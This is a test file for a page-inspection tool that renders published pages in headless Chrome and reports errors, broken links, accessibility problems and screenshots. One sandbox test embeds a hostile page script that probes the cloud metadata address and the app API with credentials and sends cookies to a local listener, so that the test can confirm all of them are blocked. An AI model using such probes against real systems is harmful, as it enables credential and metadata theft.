import { existsSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'
import { publish } from '../../src/artifacts.js'
import { db, schema } from '../../src/db/index.js'
import { env } from '../../src/env.js'
import { type InspectAnswer, inspectElsewhere, inspectHere, inspectionAnswered } from '../../src/inspect.js'
import { closeThumbnailBrowser, configureThumbnails, renderPage } from '../../src/thumbnails.js'
import { callTool, connectAgent, createPage, createUser, mcpRequest, type TestUser, type ToolResult } from './helpers.js'

const CHROME = process.env.TEST_CHROME_PATH ?? '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
const hasChrome = existsSync(CHROME)

const originalLimits = env.rateLimits

afterEach(() => {
  env.rateLimits = originalLimits
  configureThumbnails({ chromePath: '' })
  inspectElsewhere(null)
})

afterAll(async () => {
  await closeThumbnailBrowser()
})

async function agentFor(user: TestUser) {
  return (await connectAgent(user)).access_token
}

// The whole answer, images included
async function inspectRaw(token: string, args: Record<string, unknown>) {
  const res = await mcpRequest(token, 'tools/call', { name: 'inspect_artifact', arguments: args })
  expect(res.status).toBe(200)
  const body = (await res.json()) as { result: ToolResult }
  const text = body.result.content.flatMap((c) => (c.type === 'text' ? [c.text] : [])).join('\n')
  const images = body.result.content.flatMap((c) => (c.type === 'image' ? [c] : []))
  return { text, images, isError: Boolean(body.result.isError) }
}

// PNG keeps its size in the IHDR chunk
function pngSize(data: string) {
  const buf = Buffer.from(data, 'base64')
  expect(buf.subarray(1, 4).toString('latin1')).toBe('PNG')
  return { width: buf.readUInt32BE(16), height: buf.readUInt32BE(20) }
}

describe('who can inspect', () => {
  it('answers like a missing page for people who only view it, strangers and pages that do not exist', async () => {
    configureThumbnails({ chromePath: '/nonexistent/chrome' })
    const owner = await createUser()
    const viewer = await createUser({ email: 'viewer@example.com' })
    const stranger = await createUser()
    const page = await createPage(owner)
    await db.insert(schema.artifactShares).values({ artifactId: page.id, email: viewer.email, role: 'viewer' })

    for (const who of [viewer, stranger]) {
      const answer = await callTool(await agentFor(who), 'inspect_artifact', { artifact_id: page.slug })
      expect(answer).toEqual({ text: `No page you can edit has the id "${page.slug}".`, isError: true })
    }
    const missing = await callTool(await agentFor(owner), 'inspect_artifact', { artifact_id: 'doesnotexist' })
    expect(missing).toEqual({ text: 'No page you can edit has the id "doesnotexist".', isError: true })
    // Refused before any of them counted toward the limit
    expect(
      await db
        .select()
        .from(schema.rateLimits)
        .then((rows) => rows.filter((r) => r.bucket === 'inspect')),
    ).toEqual([])
  })

  it('says clearly that a server without a browser cannot inspect', async () => {
    const owner = await createUser()
    const page = await createPage(owner)
    const answer = await callTool(await agentFor(owner), 'inspect_artifact', { artifact_id: page.slug })
    expect(answer.isError).toBe(true)
    expect(answer.text).toMatch(/^Inspecting pages isn't available on this server: it has no browser/)
  })

  it('is rate-limited per account', async () => {
    env.rateLimits = 'inspect=2/1h'
    // A browser that can't start: each inspection fails at once, but still counts
    configureThumbnails({ chromePath: '/nonexistent/chrome' })
    const owner = await createUser()
    const page = await createPage(owner)
    const token = await agentFor(owner)
    for (let i = 0; i < 2; i++) {
      const answer = await callTool(token, 'inspect_artifact', { artifact_id: page.slug })
      expect(answer.text).toMatch(/^The page could not be inspected/)
    }
    const refused = await callTool(token, 'inspect_artifact', { artifact_id: page.slug })
    expect(refused.isError).toBe(true)
    expect(refused.text).toMatch(/^This account is past this server's limit of 2 page inspections per hour\. Try again in/)
    // Another account has its own count
    const other = await createUser()
    const theirs = await createPage(other)
    expect((await callTool(await agentFor(other), 'inspect_artifact', { artifact_id: theirs.slug })).text).not.toMatch(/limit/)
  })

  it('asks for a version the page does not have', async () => {
    configureThumbnails({ chromePath: '/nonexistent/chrome' })
    const owner = await createUser()
    const page = await createPage(owner, { title: 'One' })
    const answer = await callTool(await agentFor(owner), 'inspect_artifact', { artifact_id: page.slug, version: 5 })
    expect(answer).toEqual({ text: '"One" has no version 5. Call list_versions to see its versions.', isError: true })
  })
})

describe.skipIf(!hasChrome)('inspecting in headless Chrome', { timeout: 60_000 }, () => {
  let listener: Server
  let port: number
  const hits: string[] = []
  let connections = 0

  beforeAll(async () => {
    listener = createServer((req, res) => {
      hits.push(req.url ?? '')
      res.end('reached')
    })
    listener.on('connection', () => (connections += 1))
    await new Promise<void>((r) => listener.listen(0, '127.0.0.1', r))
    port = (listener.address() as AddressInfo).port
    // A cold Chrome start can take longer than the server's launch timeout (see thumbnails.test.ts)
    configureThumbnails({ chromePath: CHROME, launchTimeout: 60_000 })
    await renderPage({ html: '<h1>warm</h1>', files: [] })
  }, 90_000)

  afterAll(async () => {
    await new Promise((r) => listener.close(r))
    configureThumbnails({ launchTimeout: 15_000 })
  })

  function enable() {
    configureThumbnails({ chromePath: CHROME, cdnHosts: [] })
  }

  async function publishSite(owner: TestUser, html: string, files: { path: string; content: string; encoding?: 'utf8' | 'base64' }[] = []) {
    return publish({ userId: owner.id, email: owner.email, organizationId: null, clientName: 't', title: 'Site', html, files })
  }

  it('reports console errors, uncaught exceptions, missing files, broken links and accessibility problems, with a screenshot', async () => {
    enable()
    const owner = await createUser()
    const page = await publishSite(
      owner,
      `<!doctype html><html lang="en"><head><title>Broken</title><link rel="stylesheet" href="style.css"></head>
      <body><main><h1>Broken page</h1>
      <img src="img/missing.png">
      <a href="about.html">About</a> <a href="style.css">Styles</a> <a href="#top">Top</a> <a href="https://example.com/">Elsewhere</a>
      <div style="height: 3000px">tall</div>
      <script src="app.js"></script>
      <script>console.error('Something went wrong'); undefinedFunction()</script>
      </main></body></html>`,
      [
        { path: 'style.css', content: 'body { font-family: sans-serif }' },
        { path: 'app.js', content: 'fetch("data/missing.json").catch(() => {})' },
      ],
    )
    const { text, images, isError } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug })
    expect(isError).toBe(false)
    expect(text).toContain(`Inspected version 1 of "Site" (artifact_id: ${page.slug}).`)
    expect(text).toMatch(/- Something went wrong \(index\.html:\d+\)/)
    expect(text).toMatch(/- Uncaught ReferenceError: undefinedFunction is not defined/)
    expect(text).toContain("Files the page asked for that it doesn't have (404) (2):\n- img/missing.png\n- data/missing.json")
    expect(text).toContain("Links to files the page doesn't have (1):\n- about.html")
    expect(text).toMatch(/- image-alt \(critical\): Images must have alternative text\. 1 element: img/)
    expect(text).toContain('Fix these, publish a new version, and inspect it again before sharing the link.')
    // Failed loads are reported once, from the requests, not again from the console
    expect(text).not.toContain('Failed to load resource')

    expect(images).toHaveLength(1)
    expect(images[0].mimeType).toBe('image/png')
    // Cut off at 2000 px of a page over 3000 px tall
    expect(pngSize(images[0].data)).toEqual({ width: 1280, height: 2000 })
    expect(text).toMatch(/desktop 1280×2000 \(the page is \d+ px tall; cut off at 2000\)/)
  })

  it('keeps at most a thousand distinct console errors and broken links', async () => {
    enable()
    const owner = await createUser()
    const page = await publishSite(
      owner,
      `<!doctype html><html lang="en"><head><title>Many</title></head><body><main><h1>Many</h1><div id="links"></div>
      <script>
        const links = document.getElementById('links')
        for (let i = 0; i < 1500; i++) {
          console.error('Problem ' + i); console.error('Problem 0')
          const a = document.createElement('a')
          a.href = 'gone-' + i + '.html'
          a.textContent = 'Gone ' + i
          links.append(a)
        }
      </script></main></body></html>`,
      [],
    )
    const { text, isError } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug })
    expect(isError).toBe(false)
    expect(text).toContain('Console errors and uncaught exceptions (1000 or more):\n- Problem 0 (index.html:')
    expect(text).toContain('- and at least 980 more')
    expect(text).toContain("Links to files the page doesn't have (1000 or more):\n- gone-0.html\n- gone-1.html")
    expect(text.match(/- Problem 0 /g)).toHaveLength(1)
  })

  it('finds nothing wrong with a clean page, at desktop and phone width', async () => {
    enable()
    const owner = await createUser()
    const page = await publishSite(
      owner,
      `<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Clean</title></head>
      <body><main><h1>All good</h1><p>Nothing to see here.</p><a href="notes.txt">Notes</a></main></body></html>`,
      [{ path: 'notes.txt', content: 'hello' }],
    )
    const { text, images, isError } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug, widths: [1280, 390] })
    expect(isError).toBe(false)
    expect(text).toContain('Console errors and uncaught exceptions: none.')
    expect(text).toContain("Files the page asked for that it doesn't have (404): none.")
    expect(text).toContain("Links to files the page doesn't have: none.")
    expect(text).toContain('Accessibility (axe-core, WCAG 2.1 A and AA): no violations found.')
    expect(text).toContain('Nothing to fix.')
    expect(text).not.toContain('Not loaded here')
    expect(images.map((i) => pngSize(i.data))).toEqual([
      { width: 1280, height: 800 },
      { width: 390, height: 844 },
    ])
  })

  it('inspects an older version when asked', async () => {
    enable()
    const owner = await createUser()
    const page = await publishSite(owner, '<!doctype html><html lang="en"><title>v1</title><main><h1>One</h1><img src="a.png"></main></html>')
    await publish({ userId: owner.id, email: owner.email, organizationId: null, clientName: 't', title: 'Site', html: '<h1>Two</h1>', slug: page.slug })
    const { text } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug, version: 1 })
    expect(text).toContain('Inspected version 1 of')
    expect(text).toContain('- a.png')
  })

  it('reaches nothing beyond the page: no network, no app API, no cookies, and the page never sees axe', async () => {
    enable()
    const local = `http://127.0.0.1:${port}`
    const owner = await createUser()
    const page = await publishSite(
      owner,
      `<!doctype html><html lang="en"><title>Nosy</title><main><h1>Nosy</h1>
      <img alt="" src="${local}/img">
      <script>
        fetch('${local}/fetch').catch(() => {})
        fetch('${env.appUrl}/api/me', { credentials: 'include' }).catch(() => {})
        fetch('/api/me').catch(() => {})
        fetch('http://169.254.169.254/latest/meta-data/').catch(() => {})
        try { new WebSocket('ws://127.0.0.1:${port}/ws') } catch {}
        if (document.cookie) fetch('${local}/cookie-' + document.cookie).catch(() => {})
        setInterval(() => { if (window.axe) console.error('page saw axe') }, 5)
      </script></main></html>`,
    )
    const { text, isError } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug })
    expect(isError).toBe(false)
    expect(hits).toEqual([])
    expect(connections).toBe(0)
    expect(text).not.toContain('page saw axe')
    expect(text).not.toContain('cookie-')
    expect(text).toContain('Not loaded here')
    for (const url of [`${local}/img`, `${local}/fetch`, `${env.appUrl}/api/me`, 'http://169.254.169.254/latest/meta-data/', `ws://127.0.0.1:${port}/ws`])
      expect(text).toContain(`- ${url}`)
    // A relative /api/me is one of the page's own files, which it doesn't have
    expect(text).toContain("Files the page asked for that it doesn't have (404) (1):\n- api/me")
  })

  it('reports a page that never finishes as one that could not be inspected, and the next one works', async () => {
    enable()
    configureThumbnails({ loadTimeout: 1500, renderTimeout: 4000 })
    try {
      const owner = await createUser()
      const token = await agentFor(owner)
      const bad = await createPage(owner, { title: 'Bad', html: '<script>while (true) {}</script>' })
      const answer = await callTool(token, 'inspect_artifact', { artifact_id: bad.slug })
      expect(answer.isError).toBe(true)
      expect(answer.text).toMatch(/^The page could not be inspected: Inspecting the page took longer than 4000 ms/)
      const good = await createPage(owner, { title: 'Good' })
      expect((await callTool(token, 'inspect_artifact', { artifact_id: good.slug })).isError).toBe(false)
    } finally {
      configureThumbnails({ loadTimeout: 8000, renderTimeout: 20_000 })
    }
  })

  it('in a cluster, asks the renderer over IPC and passes the answer back', async () => {
    enable()
    const owner = await createUser()
    const page = await createPage(owner, { title: 'Elsewhere' })
    const asked: string[] = []
    // What src/server.ts and src/primary.ts do, with the message going through JSON as IPC does
    inspectElsewhere((request) => {
      asked.push(request.versionId)
      const message = JSON.parse(JSON.stringify(request)) as typeof request
      void inspectHere(message.versionId, message.widths).then((answer: InspectAnswer) =>
        inspectionAnswered(message.id, JSON.parse(JSON.stringify(answer)) as InspectAnswer),
      )
    })
    const { text, images } = await inspectRaw(await agentFor(owner), { artifact_id: page.slug })
    expect(asked).toHaveLength(1)
    expect(text).toContain('Inspected version 1 of "Elsewhere"')
    expect(images).toHaveLength(1)
  })
})
